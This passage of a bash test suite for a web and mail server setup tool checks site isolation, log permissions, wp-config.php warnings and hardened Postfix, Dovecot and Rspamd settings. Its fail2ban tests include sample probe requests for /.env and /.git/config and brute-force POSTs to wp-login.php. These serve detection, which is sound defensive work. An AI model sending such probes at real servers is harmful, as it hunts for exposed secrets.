mkdir -p "$SITES_ROOT/lr1.example.com/logs"; printf 'lr1-live\n' >"$SITES_ROOT/lr1.example.com/logs/access.log"
_lr_old_vhconf >"$LSWS_VHOSTS_DIR/lr1.example.com/vhconf.conf"
cp "$LSWS_VHOSTS_DIR/lr1.example.com/vhconf.conf" "$TMP/lr-vh-before"
: >"$SETFACL_LOG"
OPT_DRY_RUN=1; OPT_QUIET=0 lib_domain_logs_repair >"$TMP/lr-out" 2>&1; OPT_DRY_RUN=0
assert_eq    "a dry run names what it would move" "lr1.example.com" "$DOMAIN_LOGS_MOVED"
# (the home comes out of domain.json, which the native jq of Git Bash writes as a C:/ path)
assert_has   "and says so"                        "would move the logs in " "$(cat "$TMP/lr-out")"
assert_has   "naming the site's old logs/"        "/lr1.example.com/logs to ${SITES_LOG_ROOT}/lr1.example.com" "$(cat "$TMP/lr-out")"
assert_eq    "sets no ACL"                        "" "$(cat "$SETFACL_LOG")"
assert_true  "writes no vhost"                    cmp -s "$LSWS_VHOSTS_DIR/lr1.example.com/vhconf.conf" "$TMP/lr-vh-before"
assert_true  "moves nothing"                      test -f "$SITES_ROOT/lr1.example.com/logs/access.log"
assert_false "and makes no directory"             test -e "$SITES_LOG_ROOT/lr1.example.com"
eval 'lib_webmail_installed() { return 0; }'
: >"$_lr_calls"
lib_domain_logs_repair >"$TMP/lr-out" 2>&1
assert_has "a server with the webmail gets its log directory put right too" "webmail dirs" "$(cat "$_lr_calls")"
: >"$_lr_calls"
OPT_DRY_RUN=1; lib_domain_logs_repair >"$TMP/lr-out" 2>&1; OPT_DRY_RUN=0
assert_lacks "a dry run with no vhost to change has nothing to test or reload" "commit" "$(cat "$_lr_calls")"
STATE_DIR="$_state_save"
eval "$_orig_cb"; eval "$_orig_cc"; eval "$_orig_wi"; eval "$_orig_wd"; eval "$_orig_rg"
unset -f _lr_old_vhconf _lr1_old _mk_old lib_ols_is_installed stat
unset FAKE_OWNER_UID
lib_domain_state_reset
_up="$(declare -f lib_update_main)"
assert_has  "update runs it" 'lib_domain_logs_repair' "$(declare -f lib_install_migrate)"
_n_rec="$(grep -n "'.last_update'" <<<"$_up" | head -1 | cut -d: -f1 || true)"
_n_rep="$(grep -n 'lib_install_migrate' <<<"$_up" | head -1 | cut -d: -f1 || true)"
assert_true "after the update itself is recorded" test "${_n_rep:-0}" -gt "${_n_rec:-0}"
_dc="$(declare -f _doc_check_domains)"
assert_has  "doctor checks every site's logs"              'lib_ols_logdir_open "$logs"' "$_dc"
assert_has  "and fails a vhost that still writes into the home" 'lib_domain_logs_in_home "$d"' "$_dc"
assert_has  "and a log directory another user could change"    '_doc_root_only "$logs"' "$_dc"

# =============================================================================
section "site homes: closed to the other sites' users"
# Every site runs as its own user, and to that user the next site's home belongs to "others". A
# home others could pass through let one site's PHP read every world-readable file of the next.
lib_domain_state_reset
D_DOMAIN="iso.example.com"; D_IDENT="iso_example_com"; D_USER="iso_example_com"; D_GROUP="iso_example_com"
D_HOME="$SITES_ROOT/iso.example.com"; D_MODE="php"; D_PHP="8.3"
: >"$SETFACL_LOG"
assert_eq  "the directory setup exits 0" 0 "$(run_isolated lib_domain_dirs_create)"
assert_has "OpenLiteSpeed's user is let into the home by name" "-m u:nobody:x ${D_HOME}" "$(cat "$SETFACL_LOG")"
if (( CAN_CHMOD )); then
  assert_eq "a new home is the site's and its group's only" 710 "$(stat -c %a "$D_HOME")"
  assert_eq "public_html stays readable to the server inside it" 755 "$(stat -c %a "$D_HOME/public_html")"
  chmod 0711 "$D_HOME"
  run_isolated lib_domain_dirs_create >/dev/null
  assert_eq "setting a site up again closes an open home" 710 "$(stat -c %a "$D_HOME")"
fi
lib_rollback_clear; rm -rf "$D_HOME" "$SITES_LOG_ROOT/iso.example.com"
# update, for the homes an older release left open
_state_save="$STATE_DIR"; STATE_DIR="$TMP/iso-state"
_orig_dl="$(declare -f lib_domains_list)"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
for _d in is1.example.com is2.example.com is3.example.com is4.example.com; do
  _i="${_d//./_}"
  mkdir -p "$STATE_DIR/domains/$_d"
  jq -n --arg d "$_d" --arg i "$_i" --arg h "$SITES_ROOT/$_d" \
    '{domain:$d, ident:$i, user:$i, group:$i, home:$h, mode:"php",
      php:{version:"8.3", children:4, memory_limit:"256M", upload_max:"64M"}}' >"$STATE_DIR/domains/$_d/domain.json"
done
mkdir -p "$SITES_ROOT/is1.example.com/public_html" "$SITES_ROOT/is2.example.com" "$TMP/iso-victim"
printf 'x\n' >"$SITES_ROOT/is1.example.com/public_html/config.php"
assert_true "a home that is missing has nothing to close" lib_domain_home_closed "$SITES_ROOT/is4.example.com"
if (( CAN_CHMOD )); then
  chmod 0711 "$SITES_ROOT/is1.example.com"; chmod 0755 "$SITES_ROOT/is1.example.com/public_html"
  chmod 0644 "$SITES_ROOT/is1.example.com/public_html/config.php"
  chmod 0710 "$SITES_ROOT/is2.example.com"; chmod 0755 "$TMP/iso-victim"
  if (( CAN_SYMLINK )); then ln -s "$TMP/iso-victim" "$SITES_ROOT/is3.example.com"; fi
  assert_false "0711 lets other accounts in" lib_domain_home_closed "$SITES_ROOT/is1.example.com"
  assert_true  "0710 does not"               lib_domain_home_closed "$SITES_ROOT/is2.example.com"
  : >"$SETFACL_LOG"
  OPT_DRY_RUN=1; lib_domain_isolation_repair >/dev/null 2>&1; OPT_DRY_RUN=0
  assert_eq "a dry run names the open home"  "is1.example.com" "$DOMAIN_ISOLATED"
  assert_eq "and leaves it as it is"         711 "$(stat -c %a "$SITES_ROOT/is1.example.com")"
  assert_eq "with no ACL set"                "" "$(cat "$SETFACL_LOG")"
  lib_domain_isolation_repair >/dev/null 2>&1
  assert_eq "update names the home it closed" "is1.example.com" "$DOMAIN_ISOLATED"
  assert_eq "and closes it"                   710 "$(stat -c %a "$SITES_ROOT/is1.example.com")"
  # (the home comes out of domain.json, which the native jq of Git Bash writes as a C:/ path)
  assert_eq "OpenLiteSpeed's user is let in, and only there" 1 "$(grep -c -- '-m u:nobody:x .*is1\.example\.com$' "$SETFACL_LOG")"
  assert_eq "no other home is touched"        1 "$(grep -c . "$SETFACL_LOG")"
  assert_eq "nothing below it changes: the docroot" 755 "$(stat -c %a "$SITES_ROOT/is1.example.com/public_html")"
  assert_eq "nor a file"                      644 "$(stat -c %a "$SITES_ROOT/is1.example.com/public_html/config.php")"
  assert_eq "a link in place of a home is not followed" 755 "$(stat -c %a "$TMP/iso-victim")"
  : >"$SETFACL_LOG"
  lib_domain_isolation_repair >/dev/null 2>&1
  assert_eq "a second run finds nothing open" "" "$DOMAIN_ISOLATED"
  assert_eq "and sets nothing"                "" "$(cat "$SETFACL_LOG")"
  # a home the server could not be let into stays open: closed without the ACL it serves nothing
  chmod 0711 "$SITES_ROOT/is1.example.com"
  _orig_sf="$(declare -f setfacl)"; eval 'setfacl() { return 1; }'
  _out="$(OPT_QUIET=0; lib_domain_isolation_repair 2>&1; printf 'named=%s' "$DOMAIN_ISOLATED")"
  eval "$_orig_sf"
  assert_eq  "without the ACL the home is left open" 711 "$(stat -c %a "$SITES_ROOT/is1.example.com")"
  assert_has "and is not reported closed"            "named=" "$(tail -n 1 <<<"$_out")"
  assert_lacks "by name"                             "named=is1" "$_out"
  assert_has "but warned about"                      "the home was left open to other accounts" "$_out"
fi
[[ -L "$SITES_ROOT/is3.example.com" ]] && rm -f "$SITES_ROOT/is3.example.com"
rm -rf "$SITES_ROOT/is1.example.com" "$SITES_ROOT/is2.example.com" "$TMP/iso-victim"
STATE_DIR="$_state_save"; eval "$_orig_dl"
lib_domain_state_reset
_mg="$(declare -f lib_install_migrate)"
assert_has "update and self-update close the homes" 'lib_domain_isolation_repair' "$_mg"
_n_iso="$(grep -n 'lib_domain_isolation_repair' <<<"$_mg" | head -1 | cut -d: -f1 || true)"
_n_rep="$(grep -n 'lib_domain_logs_repair' <<<"$_mg" | head -1 | cut -d: -f1 || true)"
assert_true "before the step a refused vhost can end the run at" test "${_n_iso:-99}" -lt "${_n_rep:-0}"
assert_has "doctor names a home that is open" 'lib_domain_home_closed "$D_HOME"' "$(declare -f _doc_check_domains)"
assert_has "setup.sh has the command self-update runs" 'migrate)        lib_migrate_main' "$(cat "$ROOT/setup.sh")"

mkdir -p "$LSWS_VHOSTS_DIR/ih.example.com"
printf 'errorlog $VH_ROOT/logs/error.log {\n}\n' >"$LSWS_VHOSTS_DIR/ih.example.com/vhconf.conf"
assert_true  "a vhost an older release rendered writes into the home" lib_domain_logs_in_home ih.example.com
printf 'errorlog %s/error.log {\n}\n' "$SITES_LOG_ROOT/ih.example.com" >"$LSWS_VHOSTS_DIR/ih.example.com/vhconf.conf"
assert_false "one rendered now does not"                             lib_domain_logs_in_home ih.example.com
rm -rf "$LSWS_VHOSTS_DIR/ih.example.com"
if (( CAN_CHMOD )); then
  mkdir -p "$TMP/ro"; chmod 0750 "$TMP/ro"
  if (( EUID == 0 )); then assert_true "doctor: a 0750 directory of root's is root's only" _doc_root_only "$TMP/ro"
  else assert_false "doctor: a directory that is not root's is not root's only" _doc_root_only "$TMP/ro"; fi
  chmod 0770 "$TMP/ro"
  assert_false "doctor: nor one whose group may write to it" _doc_root_only "$TMP/ro"
  rm -rf "$TMP/ro"
fi
assert_has  "and the webmail's"                            'lib_ols_logdir_open "$WM_LOG_DIR"' "$(declare -f _doc_check_webmail)"

# WordPress's installer, run in the browser, leaves the wp-config.php it wrote 0666. doctor
# names such a file with the command that closes it, and does no more than look at it.
lib_domain_state_reset
D_DOMAIN="wpc.example.com"; D_USER="wpc_example_com"; D_GROUP="wpc_example_com"
D_HOME="$SITES_ROOT/wpc.example.com"; D_MODE="php"
_wc_f="$D_HOME/public_html/wp-config.php"
_wc_doc() { DOC_RESULTS=(); DOC_FAIL=0; DOC_WARN=0; DOC_OK=0; _doc_site_wp_config wpc.example.com; printf '%s' "${DOC_RESULTS[*]-}"; }
DOC_RESULTS=(); DOC_FAIL=0; DOC_WARN=0; DOC_OK=0
assert_eq "doctor: a site whose document root is missing has no wp-config.php to name" "" "$(_wc_doc)"
mkdir -p "$D_HOME/public_html"
assert_eq "nor has a site without WordPress"   "" "$(_wc_doc)"
assert_eq "and the check exits 0"              0 "$(run_isolated _doc_site_wp_config wpc.example.com)"
if (( CAN_CHMOD )); then
  printf '<?php // config\n' >"$_wc_f"; chmod 0666 "$_wc_f"
  # whose the file is decides what doctor says to do: the numbers come from a stub, as in the
  # fix-owner section, because the suite cannot own a file as anybody else
  _wc_orig_ids="$(declare -f _domain_fix_owner_ids)"
  eval '_domain_fix_owner_ids() { printf "%s" "$_wc_ids"; [[ "$_wc_ids" == [0-9]* ]]; }'
  read -r _wc_u _wc_g < <(stat -c '%u %g' "$_wc_f")
  _wc_ids="${_wc_u} ${_wc_g}"
  _wc_o="$(_wc_doc)"
  assert_has "doctor: the 0666 WordPress's installer leaves is a warning" "WARN|site wpc.example.com: wp-config.php|${_wc_f} is 0666: " "$_wc_o"
  assert_has "the site's own file is one the minute check closes, and the command is named in case it does not: as the site's user, never a chmod for root to run" "if it stays open: runuser -u wpc_example_com -- chmod 640 ${_wc_f}" "$_wc_o"
  _wc_ids="$(( _wc_u + 1 )) ${_wc_g}"; _wc_o="$(_wc_doc)"
  assert_has "a file that is not the site's own is named with fix-owner" "setup.sh fix-owner wpc.example.com" "$_wc_o"
  assert_lacks "and not with a chmod that would leave PHP unable to read it" "if it stays open" "$_wc_o"
  _wc_ids="its user wpc_example_com does not exist"
  assert_has "so is the file of a site whose account is not there" "setup.sh fix-owner wpc.example.com" "$(_wc_doc)"
  _wc_ids="${_wc_u} ${_wc_g}"
  assert_eq  "the check exits 0 with a finding too"   0 "$(run_isolated _doc_site_wp_config wpc.example.com)"
  assert_eq  "and leaves the file as it found it"     666 "$(stat -c %a "$_wc_f")"
  D_MODE="wordpress"
  assert_has "a site added with --wordpress is looked at the same way" "WARN|site wpc.example.com: wp-config.php|" "$(_wc_doc)"
  chmod 0660 "$_wc_f"
  assert_has "a file only its group may write to is named" "${_wc_f} is 0660: " "$(_wc_doc)"
  chmod 0602 "$_wc_f"
  assert_has "and one only others may write to"       "${_wc_f} is 0602: " "$(_wc_doc)"
  chmod 0640 "$_wc_f"
  assert_eq  "0640, which lomp sets itself, is no finding" "" "$(_wc_doc)"
  chmod 0644 "$_wc_f"
  assert_eq  "nor is a file others can only read"     "" "$(_wc_doc)"
  chmod 0666 "$_wc_f"
  for _m in static proxy; do
    D_MODE="$_m"
    assert_eq "no PHP runs in a ${_m} site: a wp-config.php there is not looked at" "" "$(_wc_doc)"
  done
  D_MODE="php"
  if (( CAN_SYMLINK )); then
    # a link is the site user's to point anywhere, and the chmod doctor names would follow it
    mv "$_wc_f" "$TMP/wpc-victim.php"; ln -s "$TMP/wpc-victim.php" "$_wc_f"
    assert_eq "a link in place of wp-config.php is not named" "" "$(_wc_doc)"
    rm -f "$_wc_f"; mv "$D_HOME/public_html" "$TMP/wpc-docroot"; mv "$TMP/wpc-victim.php" "$TMP/wpc-docroot/wp-config.php"
    ln -s "$TMP/wpc-docroot" "$D_HOME/public_html"
    assert_true "(the file behind the linked document root is there, and 0666)" test "$(stat -c %a "$D_HOME/public_html/wp-config.php")" = 666
    assert_eq "nor is a file behind a link in place of the document root" "" "$(_wc_doc)"
    rm -f "$D_HOME/public_html"
  fi
  eval "$_wc_orig_ids"
fi
rm -rf "$D_HOME" "$TMP/wpc-docroot" "$TMP/wpc-victim.php"
unset -f _wc_doc; unset DOC_RESULTS DOC_FAIL DOC_WARN DOC_OK
lib_domain_state_reset
assert_has  "doctor looks at the wp-config.php of every site" '_doc_site_wp_config "$d"' "$(declare -f _doc_check_domains)"

# ...and the fail2ban web jails have to match what is written there. fail2ban cuts the date
# out before it applies a failregex - "[28/Sep/2026:19:56:50 +0300]" becomes "[]" - and both
# filters wanted a character between the brackets, so they matched no line. These are
# OpenLiteSpeed's lines with the date cut; grep -P reads the patterns as fail2ban's Python does.
lib_domain_fail2ban_filters_write
_f2b_match() {   # filter line -> 0 when its failregex matches the line
  local re=""
  re="$(sed -n 's/^failregex = //p' "${FAIL2BAN_FILTER_DIR}/$1.conf")"
  printf '%s\n' "$2" | grep -qP -- "${re//<HOST>/[0-9.]+}"
}
if printf 'x\n' | grep -qP 'x' 2>/dev/null; then
  assert_true  "a probe for /.env is caught"     _f2b_match server-setup-web-probe '203.0.113.7 - - [] "GET /.env?x HTTP/1.1" 403 1240 "-" "curl/8.5.0"'
  assert_true  "over HTTP/2 too"                  _f2b_match server-setup-web-probe '203.0.113.7 - - [] "GET /.git/config HTTP/2" 404 1240 "-" "curl/8.5.0"'
  assert_false "a page that is served is not"     _f2b_match server-setup-web-probe '203.0.113.9 - - [] "GET / HTTP/1.1" 200 386 "-" "Mozilla/5.0"'
  assert_true  "a WordPress login POST is caught" _f2b_match server-setup-wp-login '203.0.113.8 - - [] "POST /wp-login.php HTTP/2" 200 1249 "-" "Mozilla/5.0"'
  assert_true  "and one to xmlrpc.php"            _f2b_match server-setup-wp-login '203.0.113.8 - - [] "POST //xmlrpc.php HTTP/1.1" 403 1249 "-" "Mozilla/5.0"'
  assert_false "the login page itself is not"     _f2b_match server-setup-wp-login '203.0.113.9 - - [] "GET /wp-login.php HTTP/1.1" 200 386 "-" "Mozilla/5.0"'
fi
# fail2ban reads a rewritten filter only on a reload, and the jail file did not change
_orig_sa="$(declare -f lib_service_active)"; _orig_run="$(declare -f lib_run)"; _orig_pi="$(declare -f lib_pkg_installed)"
eval 'lib_pkg_installed()  { [[ "$1" == "fail2ban" ]]; }'
eval 'lib_service_active() { return 0; }'
eval 'lib_run()            { printf "%s\n" "$*" >>"$TMP/f2b-runs"; }'
lib_domain_fail2ban_regen >/dev/null 2>&1
printf 'failregex = an older release\n' >"${FAIL2BAN_FILTER_DIR}/server-setup-web-probe.conf"
: >"$TMP/f2b-runs"
lib_domain_fail2ban_regen >/dev/null 2>&1
assert_has "a rewritten filter reloads fail2ban" "fail2ban-client reload" "$(cat "$TMP/f2b-runs")"
: >"$TMP/f2b-runs"
lib_domain_fail2ban_regen >/dev/null 2>&1
assert_eq  "an unchanged one does not"           "" "$(cat "$TMP/f2b-runs")"
eval "$_orig_sa"; eval "$_orig_run"; eval "$_orig_pi"

# =============================================================================
section "the mail server's own configuration"
# These assertions are the mail server's security policy in the only form that matters: the
# lines Postfix and Dovecot actually read. A renderer is pure, so a test can read every one of
# them without a package installed.
_pf="$(lib_mail_render_postfix_main mail.example.com hash ipv4)"
assert_has "the server knows the name it sends as" "myhostname = mail.example.com" "$_pf"
# mail the system sends to root must land here, not be posted back to this server as a relay
assert_has "this machine is a destination for its own mail" 'mydestination = $myhostname, localhost.$mydomain, localhost' "$_pf"
assert_has "relaying needs a login, even from this machine" "smtpd_relay_restrictions = permit_sasl_authenticated, reject_unauth_destination" "$_pf"
# a site broken into reaches 127.0.0.1:25 as easily as anything else
assert_lacks "being on the server is not a reason to relay" "smtpd_relay_restrictions = permit_mynetworks" "$_pf"
assert_has "a recipient nobody here has is refused" "reject_unlisted_recipient" "$_pf"
assert_has "no authentication before TLS" "smtpd_tls_auth_only = yes" "$_pf"
assert_has "and none at all on port 25" "smtpd_sasl_auth_enable = no" "$_pf"
assert_has "a sender must be one the login owns" "smtpd_sender_login_maps = hash:/etc/postfix/lomp/senders" "$_pf"
# the rule lives on the submission ports: Postfix skips it where SASL is off, and says so
# in the log on every single connection
assert_lacks "no sender rule where it would only be noise" "smtpd_sender_restrictions" "$_pf"
# being on the machine must not skip the sender rule or the quota check either
assert_lacks "loopback gets no free pass on recipients" $'smtpd_recipient_restrictions =\n    permit_mynetworks' "$_pf"
assert_has "the filter is reached through a socket, not a port" "smtpd_milters = unix:/run/rspamd/milter.sock" "$_pf"
# Dovecot is on this list beside root because a sieve script is Dovecot's: the webmail's own
# forward and holiday reply are sent by Pigeonhole forking sendmail(1) as vmail, and postdrop
# refused it - which Pigeonhole reads as a temporary failure, so the message that triggered the
# rule was re-queued for three days and then bounced. No site user can become vmail.
assert_has "root and Dovecot may hand mail to sendmail" "authorized_submit_users = root, ${MAIL_VMAIL_USER}" "$_pf"
assert_lacks "and nobody else"                          "authorized_submit_users = root"$'\n' "$_pf"
assert_has "delivery belongs to Dovecot" "virtual_transport = lmtp:unix:private/dovecot-lmtp" "$_pf"
assert_has "a full mailbox is refused at the door" "check_policy_service unix:private/quota-status" "$_pf"
assert_has "the mail host's own certificate is served" "smtpd_tls_chain_files = ${SSL_DEPLOY_DIR}/_mailhost/privkey.pem" "$_pf"
assert_lacks "nothing is relayed away while no relay is set" "relayhost" "$_pf"
assert_has "the table type follows what Postfix has" "virtual_mailbox_maps = lmdb:" "$(lib_mail_render_postfix_main mail.example.com lmdb ipv4)"
_pfr="$(lib_mail_render_postfix_main mail.example.com hash ipv4 smtp.example.net 2587)"
assert_has "a relay is used where one is set" "relayhost = [smtp.example.net]:2587" "$_pfr"
assert_has "with credentials from a map, not from here" "smtp_sasl_password_maps = hash:/etc/postfix/lomp/sasl_passwd" "$_pfr"
# "encrypt" demands STARTTLS and then verifies nothing, so anything that can answer for the
# relay's name presents whatever certificate it likes and is handed the AUTH line. "secure"
# checks the certificate against the name in relayhost.
assert_has "and never in the clear"        "smtp_tls_security_level = secure" "$_pfr"
assert_has "nor to whoever answers first"  "smtp_tls_CAfile" "$_pfr"
_pfre="$(lib_mail_render_postfix_main mail.example.com hash ipv4 smtp.example.net 2587 encrypt)"
assert_has   "a relay with a private certificate can be told to accept less" "smtp_tls_security_level = encrypt" "$_pfre"
assert_lacks "and then there is nothing to check it against"                 "smtp_tls_CAfile" "$_pfre"
assert_has   "an unset TLS level reads as the safe one" "secure" "$(lib_mail_relay_get tls)"

_mc="$(lib_mail_render_postfix_master)"
assert_eq "every submission port checks sender against login" 3 "$(grep -c 'reject_authenticated_sender_login_mismatch' <<<"$_mc")"
assert_eq "and every one of them demands a password" 3 "$(grep -c 'smtpd_sasl_auth_enable=yes' <<<"$_mc")"
assert_eq "an unsigned message never leaves the building" 3 "$(grep -c 'milter_default_action=tempfail' <<<"$_mc")"
# what port 25 does is decided in its own block, which ends where the next service begins
_smtp25="$(awk '/^smtp +inet/{f=1;next} /^[a-z0-9.:]+ +(inet|unix)/{f=0} f' <<<"$_mc")"
assert_lacks "port 25 offers no authentication at all" "smtpd_sasl_auth_enable=yes" "$_smtp25"
assert_has "and takes mail in even when the filter is down" "milter_default_action=accept" "$_smtp25"
# Postfix evaluates the HELO rules at RCPT time, so main.cf's "needs a fully-qualified name"
# reached authenticated clients too: Outlook says EHLO <computer name>, with no dot, and got
# "504 Helo command rejected" on the first recipient - able to receive, never able to send.
# Port 25 keeps the strict list, where a stranger's HELO is worth something.
assert_eq  "every submission port relaxes the HELO rules" 3 "$(grep -c 'smtpd_helo_restrictions=permit_mynetworks,permit_sasl_authenticated,reject_invalid_helo_hostname' <<<"$_mc")"
assert_lacks "port 25 keeps the strict ones"              "smtpd_helo_restrictions" "$_smtp25"
assert_has  "which still ask for a name that resolves"    "reject_non_fqdn_helo_hostname" "$_pf"
# The webmail has a submission port of its own, and it is the only one without TLS. That is
# only safe while it is bound to the loopback: on any other address it would be a password
# on the wire, so the address is part of the line and not a setting somewhere else.
assert_has  "the webmail submits on its own port" "127.0.0.1:10587 inet" "$_mc"
_wmport="$(sed -n '/^127.0.0.1:10587/,/^[a-z0-9]/p' <<<"$_mc")"
assert_has  "without TLS, because it never leaves the machine" "smtpd_tls_security_level=none" "$_wmport"
assert_has  "but never without a password"                     "smtpd_sasl_auth_enable=yes"    "$_wmport"
assert_has  "and never as somebody else"                       "reject_authenticated_sender_login_mismatch" "$_wmport"
assert_has  "and never unsigned"                               "milter_default_action=tempfail" "$_wmport"
assert_lacks "no other port takes a password in the clear" "smtpd_tls_security_level=none" "$_smtp25"

_dc="$(lib_mail_render_dovecot_local mail.example.com)"
assert_eq "the Dovecot configuration closes every brace it opens" 0 \
  "$(awk '{o+=gsub(/\{/,"{"); c+=gsub(/\}/,"}")} END{print o-c}' <<<"$_dc")"
assert_has "no mailbox is opened without TLS" "ssl = required" "$_dc"
# Dovecot treats a loopback connection as already secure, so a plain 143 would be a password
# oracle for every user of the machine - even now that there is a webmail, which speaks TLS
# to 993 like any other client
assert_has "plain IMAP is switched off" $'inet_listener imap {\n    port = 0' "$_dc"
assert_has "IMAPS is the way in" $'inet_listener imaps {\n    port = 993' "$_dc"
# ManageSieve is what the webmail's filters and holiday replies talk to. The protocol has to
# be named here too: this file is read last and would otherwise override the line the
# managesieved package drops into protocols.d, and the service would never start.
assert_has "sieve is one of the protocols" "protocols = imap lmtp sieve" "$_dc"
assert_has "and ManageSieve listens"       $'inet_listener sieve {\n    address = 127.0.0.1\n    port = 4190' "$_dc"
assert_has "Postfix authenticates through Dovecot" "/var/spool/postfix/private/auth" "$_dc"
assert_has "and delivers through it" "/var/spool/postfix/private/dovecot-lmtp" "$_dc"
assert_has "every mailbox is one directory" "mail_location = maildir:/var/vmail/%Ld/%Ln/Maildir" "$_dc"
# Dovecot expands % in a plugin value, so a literal percent has to be written twice
assert_has "the quota grace survives that expansion" "quota_grace = 10%%" "$_dc"
assert_has "and the count backend gets its index" "mailbox_list_index = yes" "$_dc"
assert_has "spam lands in Junk, never in the bin" "sieve_before = /etc/dovecot/sieve/spam-to-junk.sieve" "$_dc"
assert_lacks "and a Linux account is not a mailbox" "auth-system" "$_dc"
# that one only says local.conf does not ask for it; this one runs the code that takes the
# packaged include away, which is what actually keeps a site user out of IMAP
MAIL_DOVECOT_10AUTH="$TMP/10-auth.conf"
printf 'auth_mechanisms = plain\n!include auth-system.conf.ext\n#!include auth-passwdfile.conf.ext\n' >"$MAIL_DOVECOT_10AUTH"
MAIL_CHANGED=0
lib_mail_pam_disable >/dev/null 2>&1
assert_has   "the packaged system-user include is commented out" '#!include auth-system.conf.ext' "$(cat "$MAIL_DOVECOT_10AUTH")"
assert_eq    "no line of it is left active" 0 "$(grep -c '^[[:space:]]*!include auth-system' "$MAIL_DOVECOT_10AUTH" || true)"
assert_eq    "and that counts as a change, so Dovecot is restarted" 1 "$MAIL_CHANGED"
MAIL_CHANGED=0
lib_mail_pam_disable >/dev/null 2>&1
assert_eq    "running it again changes nothing" 0 "$MAIL_CHANGED"
_da="$(lib_mail_render_dovecot_auth)"
assert_has "the user store is a file of hashes" "scheme=BLF-CRYPT" "$_da"
assert_has "owned by one user that owns no site" "uid=vmail gid=vmail" "$_da"
assert_lacks "and there is no PAM anywhere near it" "pam" "$_da"

_dk="$(lib_mail_render_rspamd_dkim dkim_signing)"
assert_has "only an authenticated sender is signed for" "sign_authenticated = true" "$_dk"
assert_has "being local is not a reason to sign" "sign_local = false" "$_dk"
assert_has "and the From: domain must own the key" "allow_hdrfrom_mismatch = false" "$_dk"
_rc="$(lib_mail_render_rspamd_worker_controller 'Sup3rS3cretControllerPw')"
assert_has "the Rspamd interface has no port" 'bind_socket = "/run/rspamd/controller.sock' "$_rc"
assert_has "it still asks for a password over that socket" 'enable_password = "Sup3rS3cretControllerPw"' "$_rc"
assert_lacks "and trusts no address without one" "secure_ip = [\"127.0.0.1\"]" "$_rc"
assert_lacks "and without one, sets none" 'enable_password = "' "$(lib_mail_render_rspamd_worker_controller '')"
_rp="$(lib_mail_render_rspamd_worker_proxy)"
# whoever speaks the milter protocol says who authenticated, and that is what DKIM signs on
assert_has "the milter is a socket only Postfix can open" 'bind_socket = "/run/rspamd/milter.sock mode=0660 owner=_rspamd group=lompmilter"' "$_rp"
assert_lacks "not a port any local user can reach" "127.0.0.1:11332" "$_rp"
assert_has "the unused worker is switched off, not merely set to zero" "enabled = false" "$(lib_mail_render_rspamd_worker_normal)"
_rl="$(lib_mail_render_rspamd_ratelimit)"
# the bucket is keyed on the account, which is what a compromised site would be sending with
assert_has "an account may send 100 messages an hour" 'rate = "100 / 1h"' "$_rl"
_rr="$(lib_mail_render_rspamd_redis)"
assert_has "Rspamd talks to its own Redis over a socket" "/run/lomp-redis-rspamd/redis.sock" "$_rr"
_ru="$(lib_mail_render_redis_unit)"
assert_has "which runs as the filter's own user" "User=_rspamd" "$_ru"
# what the filter learned about this server's mail is nobody else's business
assert_has "its dataset on disk is closed to everyone else" "StateDirectoryMode=0700" "$_ru"
assert_has "including the files it writes there" "UMask=0077" "$_ru"
assert_has "and it starts before the filter that needs it" "Before=rspamd.service" "$_ru"
_rk="$(lib_mail_render_redis_conf)"
assert_has "and answers on no TCP port" "port 0" "$_rk"
assert_has "with a socket nobody else can open" "unixsocketperm 700" "$_rk"

_j="$(lib_mail_render_jails)"
assert_has "fail2ban reads Postfix where Ubuntu logs it" "journalmatch = _SYSTEMD_UNIT=postfix@-.service" "$_j"
assert_has "and Dovecot the same way" "journalmatch = _SYSTEMD_UNIT=dovecot.service" "$_j"
# the addresses never to ban are in the [DEFAULT] section of the base jail file, which
# fail2ban applies here too; repeating them would mean two places to keep in step
assert_lacks "the mail jails repeat no ignore list" "ignoreip" "$_j"

# the renderers are used as "renderer | lib_write_file": one that ends on a false test exits 1
for fn in lib_mail_render_postfix_master lib_mail_render_dovecot_auth lib_mail_render_sieve_spam \
          lib_mail_render_rspamd_worker_proxy lib_mail_render_rspamd_worker_normal \
          lib_mail_render_rspamd_worker_controller lib_mail_render_rspamd_options \
          lib_mail_render_rspamd_dropin \
          lib_mail_render_rspamd_redis lib_mail_render_rspamd_actions lib_mail_render_rspamd_ratelimit \
          lib_mail_render_redis_conf lib_mail_render_redis_unit lib_mail_render_unbound; do
  assert_eq "${fn} exits 0" 0 "$(run_isolated "$fn")"
done
assert_eq "lib_mail_render_postfix_main exits 0" 0 "$(run_isolated lib_mail_render_postfix_main mail.example.com hash ipv4)"
assert_eq "lib_mail_render_dovecot_local exits 0" 0 "$(run_isolated lib_mail_render_dovecot_local mail.example.com)"
assert_eq "lib_mail_render_jails exits 0" 0 "$(run_isolated lib_mail_render_jails)"
assert_eq "lib_mail_render_rspamd_classifier exits 0" 0 "$(run_isolated lib_mail_render_rspamd_classifier 0)"

assert_true  "a mail host is a name under a domain" lib_mail_hostname_valid "mail.example.com"
assert_false "a bare label is not one"              lib_mail_hostname_valid "localhost"
assert_false "and neither is an empty string"       lib_mail_hostname_valid ""
# a fresh VPS image calls itself something like srv1.localdomain, which looks like a name and
# can never receive a certificate or pass a recipient's HELO check
assert_true  "a real name can send mail"     lib_mail_name_usable "mail.example.com"
assert_false "the image's own name cannot"   lib_mail_name_usable "srv1.localdomain"
assert_false "nor a name reserved for tests" lib_mail_name_usable "mail.lomp.test"
assert_false "nor one on the local network"  lib_mail_name_usable "mail.home.lan"
# the WebAdmin may not take a port the mail server answers on
assert_eq "the WebAdmin cannot sit on the submission port" 1 "$(run_isolated lib_install_parse_args --admin-port 587 --skip-upgrade)"
assert_eq "nor on IMAPS" 1 "$(run_isolated lib_install_parse_args --admin-port 993 --skip-upgrade)"

# A relay password is given on stdin and ends up in exactly one file, which only root reads.
MAIL_POSTFIX_DIR="$TMP/pf"; MAIL_SASL_MAP="$TMP/pf/sasl_passwd"
MAIL_STATE_DIR="$TMP/mailstate"; MAIL_RELAY_INFO="$TMP/mailstate/relay.info"
mkdir -p "$MAIL_POSTFIX_DIR" "$MAIL_STATE_DIR"
( eval 'lib_mail_postmap() { return 0; }
        lib_mail_apply() { return 0; }
        lib_mail_host() { printf "mail.example.com"; }
        lib_manifest_set_json() { return 0; }'
  printf '%s\n' 'R3layS3cretPw' | lib_mail_relay_set smtp.example.net 2587 me@example.net ) >/dev/null 2>&1
